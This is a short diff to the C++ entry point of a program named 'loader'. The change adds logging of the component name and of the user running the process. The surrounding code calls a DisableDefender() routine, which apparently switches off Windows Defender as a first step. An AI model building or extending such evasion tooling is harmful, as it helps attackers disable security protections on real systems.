@@ -1,7 +1,10 @@
 #include "loader.hpp"
 
+std::string componentName = "loader";
+
 int wmain() {
-	Log("[+] Starting loader.", "loader");
+	Log("[+] Starting " + componentName + ".", componentName);
+	Log("[*] Running as " + UserRunningProcess(), componentName);
 
 	if (DisableDefender() != 0) {
 		// disabling defender failed
